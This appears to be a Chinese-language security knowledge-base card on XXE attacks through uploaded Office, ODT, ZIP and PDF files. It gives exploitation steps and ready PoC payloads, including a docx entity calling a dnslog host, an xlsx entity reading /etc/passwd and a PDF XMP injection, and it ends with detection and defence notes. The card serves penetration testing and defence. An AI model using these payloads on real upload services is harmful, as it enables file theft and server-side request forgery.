---
id: web-generic-xxe-ooxml-container-upload
title: OOXML/容器格式上传 XXE：docx/xlsx/pptx/odt/zip/PDF 内嵌 XML 部件被服务端解析时触发外部实体
type: scenario
domain: web
path: web/generic/xxe
technique: ooxml-container-upload-xxe
aliases:
- Office 文档上传 XXE
- docx XXE
- xlsx XXE
- pptx XXE
- odt XXE
- 压缩包 XXE
- PDF XMP XXE
- docem 工具
tags:
- xxe
- file-upload
- ooxml
- docx
- xlsx
- pptx
- odt
- zip
- pdf
- office-parser
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:59:41+08:00'
  notes: 已对照原文核对；docx/xlsx/zip/PDF 内嵌 XML 部件作载体与原文一致，各格式最小 payload 为按原文思路补全的可用形态；原文对 docx 仅给 docem 工具、对 PDF 仅写到尝试，未给成功回显，卡内 confidence=medium 与边界已反映；未上传测试
---

## 一句话结论

docx/xlsx/pptx/odt 本质是 ZIP 容器，内部全是 XML 部件（`[Content_Types].xml`、`word/document.xml`、`xl/xmlMaps.xml`、`_rels/*.rels` 等）；只要上传点在后端用"会解析 XML 的 Office 文档库"（Apache POI、开发者自写的解析代码、文档预览/转码服务）打开文件，把某个部件替换成带 `<!DOCTYPE ... SYSTEM "http://dnslog/">` 的 XML 就能触发 XXE——有回显时读文件，无回显时靠 DNS/HTTP 外带确认；PDF 的 XMP 元数据、含 XML 的 ZIP 同样是候选载体。

## 原理

- **容器即入口**：Office 新格式（OOXML）与 OpenDocument 都是 ZIP + 多份 XML。解压后可见 `_rels/`、`docProps/`、`word/`（docx）或 `xl/`（xlsx，含 `xmlMaps.xml`/`workbook.xml`/`sharedStrings.xml`）；每个 XML 部件都会被解析器单独加载。
- **解析器决定是否解析实体**：若框架/库使用未关闭外部实体的解析器（旧版 Apache POI、未配置的 DOM/SAX、第三方文档转换器），替换任一部件即可让解析阶段去读 `file://` 或发起 HTTP/DNS 请求。
- **为什么在"上传"场景成立**：上传接口通常只校验扩展名/MIME（`application/vnd.openxmlformats-officedocument...`），只要文件能被 ZIP 解开且仍被识别为 Office 文档，内部的 XML 内容不受检查；而解析发生在服务端（预览、导入、内容提取、格式转换），用户浏览器不参与。
- **工具化**：docem 之类工具会把指定 payload 批量注入 docx/odt/pptx/xlsx 的每个 XML 部件，省去手工解压改包；但**注入点应针对"会被解析"的部件**（盲注入全部部件也能提高命中率，代价是文件可能损坏导致解析提前报错）。
- **无回显判读**：Office 解析类漏洞常常只表现为"服务器发起了 DNS/HTTP 请求"（原文对 POI 的 CVE-2019-12415 也注明"这个洞有点弱，只能访问 dnslog"），其价值是确认 XXE 可达并作为后续读文件/SSRF 的前置；若要读文件，需要解析器支持外部实体展开并有回显通道。
- **PDF 的特殊性**：PDF 不是 ZIP，但内部可以有 XML 元数据流（XMP，见 `<?xpacket begin=...?>`、`<x:xmpmeta>`、`<rdf:Description>` 等标签）。这类 XML 是否被解析取决于后端库（如 Apache Tika 的 XFA/XMP 处理路径），把 XXE payload 插入元数据流同样可能触发外部请求。

## 触发条件

- 上传点允许 Office/压缩包/PDF 类文件（扩展名或 MIME 校验可满足），且文件会被服务端解析（预览、缩略图、导入、内容索引、格式转换）；
- 解析库/代码未禁用外部实体与外部 DTD（旧版 POI、未加固 DOM/SAX、默认配置的文档转换器）；
- 目标可出网（DNS 或 HTTP）或有回显通道；
- 攻击者能构造合法可解析的容器（部件结构、content-type 声明、关系文件保持一致，否则解析在实体展开前就失败）。

## 利用步骤

1. 确认上传点类型与后端行为：上传一个正常 docx/xlsx，观察是否返回预览、缩略图、解析出的文本或转码结果——有解析行为才值得尝试。
2. 解压样本，列出 XML 部件（docx：`[Content_Types].xml`、`word/document.xml`、`docProps/*.xml`、`_rels/.rels`；xlsx：`xl/workbook.xml`、`xl/xmlMaps.xml`、`xl/sharedStrings.xml`）。
3. 选一个必然被解析的部件（通常是主文档 `word/document.xml` 或工作簿 `xl/workbook.xml`），在文件开头插入 DOCTYPE 与外部实体，并在正文/单元格文本处引用实体。
4. 重新打包（保持 ZIP 结构与文件名，必要时用 store 模式避免压缩差异），上传并用 DNSLog/Burp Collaborator 观察是否有请求。
5. 若有回显则改为读 `file:///etc/passwd`（或 `php://filter/convert.base64-encode/resource=...`）；若无回显则用外部 DTD + 参数实体做 OOB 外带。
6. 批量尝试其它容器（pptx/odt/含 XML 的 zip/PDF XMP），并针对不同后端库分别试 payload。

## PoC

docx 主文档部件注入（最直观）：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<dnslog-domain>/probe">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>
```

xlsx 工作簿部件注入：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets><sheet name="&xxe;" sheetId="1" r:id="rId1"/></sheets>
</workbook>
```

PDF XMP 元数据（在 `<?xpacket begin=...?>` 与 `<x:xmpmeta>` 之间插入 DOCTYPE 与实体，并在 `dc:title` 等字段引用）：

```xml
<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://<dnslog-domain>/probe">]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
    <rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">
      <dc:title>&xxe;</dc:title>
    </rdf:Description>
  </rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
```

## 变体与关联

- 变体：docx/xlsx 之外，pptx（`ppt/slides/*.xml`）、odt（`content.xml`）、含任意 XML 的 `.zip` 均可作为载体；关键不是扩展名而是"服务端是否解析其中的 XML"。
- 变体：用 docem 批量把 payload 注入每个 XML 部件，靠覆盖所有解析路径提高命中率。
- 变体：只针对会触发外部 schema 加载的部件（如 xlsx 的 `xl/xmlMaps.xml`），见关联卡。
- 关联：[[web-generic-xxe-svg-upload-inband-file-read]]（最典型的"图片格式即 XML"载体，回显读文件）。
- 关联：[[web-java-component-poi-xlsx-cve-2019-12415-schema-redirect]]（xlsx `xmlMaps.xml` 被 POI 处理时通过 XML schema 重定向发起请求）。
- 关联：[[web-generic-xxe-data-uri-base64-hide-system-uri]]（把实体 URI 编码以过关键字过滤，可与本卡组合）。
- 边界：解析器已完全禁用 DTD/外部实体（如 POI 4.x/5.x 默认加固、Tika 的安全特性）时，注入的 DOCTYPE 会被忽略或直接报错；容器结构损坏会导致解析提前失败。

## 检测与防御

- 检测：上传的 Office/PDF 文件解析时出现 DNS/HTTP 外联（尤其指向一次性域名）；解包后 XML 部件含 `DOCTYPE`/`ENTITY`；解析器日志出现 `file://`、`http://` 外部实体加载或 schema 远程加载。
- 防御：上传后先做 ZIP 结构校验并剥离/忽略 DOCTYPE；用禁用外部实体与外部 DTD 的解析器配置（POI 的 secure processing/Xerces 安全特性、`XMLConstants.ACCESS_EXTERNAL_DTD=""`）；文档解析放在无出网、无敏感文件挂载的沙箱容器中执行。
